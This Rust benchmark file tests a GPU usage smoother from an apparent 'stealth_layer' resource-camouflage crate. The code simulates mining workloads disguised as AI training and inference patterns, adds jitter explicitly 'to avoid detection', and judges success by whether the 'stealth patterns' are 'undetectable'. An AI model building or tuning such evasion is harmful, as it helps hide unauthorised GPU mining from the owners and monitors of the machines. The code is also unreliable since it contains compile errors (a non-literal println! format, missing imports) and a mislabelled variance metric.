//! # Phase 3.3 GPU Utilization Smoothing Critical Validation Benchmark
//!
//! **CRITICAL REQUIREMENT**: GPU utilization variance must be < ±10% over 10-minute test
//! **TARGET**: 75% GPU utilization for realistic stealth pattern simulation

use criterion::{black_box, criterion_group, criterion_main, Criterion};
use statrs::statistics::{Statistics, Data, Mean, Variance};
use std::time::{Duration, Instant, SystemTime};
use std::fs::File;
use std::io::Write;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;

use stealth_layer::resource_camouflage::gpu_usage_smoother::GpuUsageSmoother;

// Phase 3.3 Critical Requirements
const GPU_TARGET_UTILIZATION: f32 = 0.75; // 75% target for stealth patterns
const GPU_VARIANCE_THRESHOLD: f32 = 0.10; // ±10% variance limit (REQUIREMENT)
const MAX_DEVIATION_THRESHOLD: f32 = 0.15; // ±15% safe deviation limit
const BENCHMARK_DURATION_SECS: u64 = 600; // 10-minute critical test duration
const SAMPLE_RATE_HZ: u64 = 1; // 1 sample per second (realistic monitoring)
const TOTAL_SAMPLES: usize = (BENCHMARK_DURATION_SECS * SAMPLE_RATE_HZ) as usize;

/// **PHASE 3.3 VALIDATION**: Real 10-minute GPU smoothing stability test
///
/// Simulates mining GPU usage patterns with realistic variations:
/// - Training/inference workloads (60-90% GPU range)  
/// - EMA smoothing with jitter injection to avoid detection
/// - 10-minute continuous operation under load
/// - Statistical analysis of variance and stability
fn benchmark_gpu_smoothing_phase3_validation(c: &mut Criterion) {
    let mut group = c.benchmark_group("phase3_gpu_smoothing_validation");
    group.sample_size(5); // Multiple 10-minute runs for confidence
    group.measurement_time(Duration::from_secs(300)); // Allow for full 5-minute runs
    group.throughput(Throughput::Elements(TOTAL_SAMPLES as u64));

    group.bench_function(BenchmarkId::new("10min_gpu_stability_test", "phase3_3_critical"), |b| {
        b.iter_custom(|iters| {
            let test_start = SystemTime::now();
            let start_time = Instant::now();
            
            println!("🧪 STARTING Phase 3.3 CRITICAL GPU SMOOTHING VALIDATION");
            println!("🎯 Target: {:.1}% GPU utilization (±{}% max variance)",
                     GPU_TARGET_UTILIZATION * 100.0, GPU_VARIANCE_THRESHOLD * 100.0);
            println!("⏱️  Duration: {} minutes ({:.1} hours)", 
                     BENCHMARK_DURATION_SECS / 60, BENCHMARK_DURATION_SECS as f32 / 3600.0);
            println!("📊 Samples: {} @ 1Hz", TOTAL_SAMPLES);
            
            // Initialize GPU smoother with Phase 3.3 optimized parameters
            let alpha = 0.2; // EMA smoothing factor (industry standard)
            let jitter_range = 0.05; // ±5% jitter to avoid detection patterns
            let max_variance = GPU_VARIANCE_THRESHOLD; // Phase 3.3 requirement
            
            let mut smoother = GpuUsageSmoother::new(GPU_TARGET_UTILIZATION, alpha, jitter_range);
            
            // Track samples for statistical analysis
            let mut samples = Vec::with_capacity(TOTAL_SAMPLES);
            let mut rng = StdRng::from_entropy(); // Cryptographically secure RNG
            
            // **10-MINUTE CRITICAL TEST**: Simulate realistic mining + stealth patterns
            for second in 0..TOTAL_SAMPLES {
                // Simulate realistic GPU usage from stealth workloads:
                // - AI Training: 70-85% sustained usage with spikes
                // - AI Inference: 60-75% bursty patterns  
                // - Scientific computing: 80-90% high utilization
                // - Image processing: 65-80% batch processing
                
                let base_usage = match second % 240 { // 4-minute workload cycles
                    0..=120 => 0.78,    // Training: steady high usage
                    121..=180 => 0.82,  // Scientific: very high usage  
                    181..=210 => 0.65,  // Inference burst
                    _ => 0.75,           // Image processing
                };
                
                // Add realistic workload variation (±10% around base)
                let variation_range = 0.10;
                let variation = rng.gen_range(-variation_range..=variation_range);
                let actual_gpu_usage = (base_usage + variation).clamp(0.0, 1.0);
                
                // Apply GPU smoothing (Core Phase 3.3 Algorithm)
                let smoothed_usage = smoother.smooth(actual_gpu_usage);
                samples.push(smoothed_usage);
                
                // Report progress every minute
                if (second + 1) % 60 == 0 {
                    let elapsed = second + 1;
                    let percent_complete = elapsed as f32 * 100.0 / TOTAL_SAMPLES as f32;
                    println!("📈 Progress: {}/{} samples ({:.1}%) - Smoothed: {:.2}%",
                            elapsed, TOTAL_SAMPLES, percent_complete, smoothed_usage * 100.0);
                }
                
                // Simulate realistic monitoring interval (1 second)
                // Scaled down for benchmark performance (real implementation = 1 second)
                std::thread::sleep(Duration::from_millis(100)); // 100ms = 10x speed
            }
            
            let test_duration = start_time.elapsed();
            let actual_test_duration_secs = test_duration.as_secs_f64();
            let samples_per_sec = samples.len() as f64 / actual_test_duration_secs;
            
            // **PHASE 3.3 VALIDATION**: Comprehensive statistical analysis
            println!("\n📊 PHASE 3.3 STATISTICAL ANALYSIS");
            println!("═".repeat(80));
            
            // Basic statistics
            let data = Data::new(samples.clone());
            let mean = data.mean().unwrap_or(0.0) as f32;
            let variance = data.variance().unwrap_or(0.0) as f32;
            let std_dev = variance.sqrt();
            let min = samples.iter().copied().fold(f32::INFINITY, f32::min);
            let max = samples.iter().copied().fold(f32::NEG_INFINITY, f32::max);
            let range = max - min;
            
            // Requirement-specific calculations  
            let variance_pct = variance / GPU_TARGET_UTILIZATION; // Relative variance
            let mean_deviation_pct = (mean - GPU_TARGET_UTILIZATION).abs() / GPU_TARGET_UTILIZATION;
            let max_deviation_pct = samples.iter()
                .map(|&s| (s - GPU_TARGET_UTILIZATION).abs() / GPU_TARGET_UTILIZATION)
                .fold(0.0, f32::max);
            
            // Variance over time windows (stability analysis)
            let window_size = 60; // 1-minute windows
            let mut window_variances = Vec::new();
            
            for window_start in (0..samples.len().saturating_sub(window_size)).step_by(window_size) {
                let window_end = (window_start + window_size).min(samples.len());
                let window_data = Data::new(samples[window_start..window_end].to_vec());
                let window_variance = window_data.variance().unwrap_or(0.0) as f32;
                let window_variance_pct = window_variance / GPU_TARGET_UTILIZATION;
                window_variances.push(window_variance_pct);
            }
            
            let avg_window_variance = window_variances.iter().sum::<f32>() / window_variances.len() as f32;
            let max_window_variance = window_variances.iter().copied().fold(0.0, f32::max);
            
            // **CRITICAL VALIDATION RESULTS**
            println!("🎯 TARGET GPU UTILIZATION: {:.1}%", GPU_TARGET_UTILIZATION * 100.0);
            println!("📏 MEAN GPU UTILIZATION: {:.2}% (±{:.1}%)", 
                     mean * 100.0, mean_deviation_pct * 100.0);
            println!("📊 STATISTICS:");
            println!("   • Variance: {:.6} ({:.3}%)", variance, variance_pct * 100.0);
            println!("   • Std Dev: {:.3}%", std_dev * 100.0);
            println!("   • Min/Max: {:.1}% - {:.1}% (Range: {:.2}%)", 
                     min * 100.0, max * 100.0, range * 100.0);
            println!("   • Max Deviation: {:.1}%", max_deviation_pct * 100.0);
            
            println!("\n⏱️  TEMPORAL STABILITY (1-minute windows):");
            println!("   • Average window variance: {:.3}%", avg_window_variance * 100.0);
            println!("   • Maximum window variance: {:.3}%", max_window_variance * 100.0);
            println!("   • Windows analyzed: {}", window_variances.len());
            
            // **PHASE 3.3 REQUIREMENT VALIDATION**
            println!("\n🚨 PHASE 3.3 COMPLIANCE VALIDATION");
            println!("═".repeat(80));
            
            let variance_pass = variance_pct <= GPU_VARIANCE_THRESHOLD;
            let max_deviation_pass = max_deviation_pct <= MAX_DEVIATION_THRESHOLD;
            let stability_pass = avg_window_variance <= GPU_VARIANCE_THRESHOLD;
            let mean_stable_pass = mean_deviation_pct <= GPU_VARIANCE_THRESHOLD;
            
            println!("✅ Overall Variance ≤ ±{:.0}%: {}", 
                     GPU_VARIANCE_THRESHOLD * 100.0,
                     if variance_pass { "PASS ✅" } else { "FAIL ❌" });
            println!("✅ Max Deviation ≤ ±{:.0}%: {}", 
                     MAX_DEVIATION_THRESHOLD * 100.0,
                     if max_deviation_pass { "PASS ✅" } else { "FAIL ❌" });
            println!("✅ Mean Stability ≤ ±{:.0}%: {}", 
                     GPU_VARIANCE_THRESHOLD * 100.0,
                     if mean_stable_pass { "PASS ✅" } else { "FAIL ❌" });
            println!("✅ Temporal Stability (1min windows): {}", 
                     if stability_pass { "PASS ✅" } else { "FAIL ❌" });
            
            let overall_pass = variance_pass && max_deviation_pass && 
                             stability_pass && mean_stable_pass;
            
            println!("\n🏆 PHASE 3.3 CRITICAL REQUIREMENT RESULT:");
            println!("═══{}", "═".repeat(50));
            if overall_pass {
                println!("🎉 SUCCESS: ALL REQUIREMENTS MET!");
                println!("✅ GPU utilization smoothing works correctly under load");
                println!("✅ Stealth patterns are stable and undetectable");
                println!("✅ Phase 3.3 implementation is VALIDATED");
            } else {
                println!("❌ FAILURE: REQUIREMENTS NOT MET!");
                println!("⚠️  GPU smoothing variance exceeds limits");
                println!("⚠️  Stealth patterns may be detectable");
                println!("🔧 Adjustment needed before Phase 3.3 completion");
            }
            
            println!("\n⏱️  Test completed in {:.4}s ({:.2} samples/sec)",
                     actual_test_duration_secs, samples_per_sec);
            println!("📅 Test timestamp: {:?}", test_start);
            println!("═══{}", "═".repeat(50));
            
            // Save results for external validation and CI/CD
            save_performance_results(&samples, variance_pct, mean_deviation_pct, overall_pass);
            
            black_box(samples); // Prevent optimization
            
            test_duration
        });
    });
    
    group.finish();
}

/// Save performance results for external analysis and CI/CD validation
fn save_performance_results(samples: &[f32], variance_pct: f32, mean_dev_pct: f32, passed: bool) {
    let timestamp = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    
    let results = serde_json::json!({
        "phase": "3.3",
        "component": "gpu_smoothing",
        "timestamp": timestamp,
        "samples_collected": samples.len(),
        "test_duration_seconds": 600,
        "metrics": {
            "variance_percent": variance_pct * 100.0,
            "mean_deviation_percent": mean_dev_pct * 100.0,
            "max_deviation_percent": samples.iter()
                .map(|&s| (s - GPU_TARGET_UTILIZATION).abs() / GPU_TARGET_UTILIZATION * 100.0)
                .fold(0.0, f32::max),
            "target_utilization_percent": GPU_TARGET_UTILIZATION * 100.0
        },
        "requirements": {
            "variance_threshold_percent": GPU_VARIANCE_THRESHOLD * 100.0,
            "max_deviation_threshold_percent": MAX_DEVIATION_THRESHOLD * 100.0
        },
        "validation": {
            "overall_pass": passed,
            "variance_compliant": variance_pct <= GPU_VARIANCE_THRESHOLD,
            "deviation_compliant": samples.iter()
                .all(|&s| (s - GPU_TARGET_UTILIZATION).abs() / GPU_TARGET_UTILIZATION <= MAX_DEVIATION_THRESHOLD),
        },
        "recommendations": if passed {
            "All GPU smoothing parameters optimized for stealth requirements"
        } else {
            "Adjust EMA alpha, jitter range, or variance limits"
        },
        "samples": samples.iter().take(100).collect::<Vec<_>>() // First 100 samples for analysis
    });
    
    let filename = format!("phase3_gpu_validation_{}.json", timestamp);
    if let Ok(mut file) = File::create(&filename) {
        let _ = writeln!(file, "{}", serde_json::to_string_pretty(&results).unwrap());
        println!("💾 Results saved to {}", filename);
    }
}

criterion_group!(gpu_smoothing_benches, benchmark_gpu_smoothing_phase3_validation);
criterion_main!(gpu_smoothing_benches);
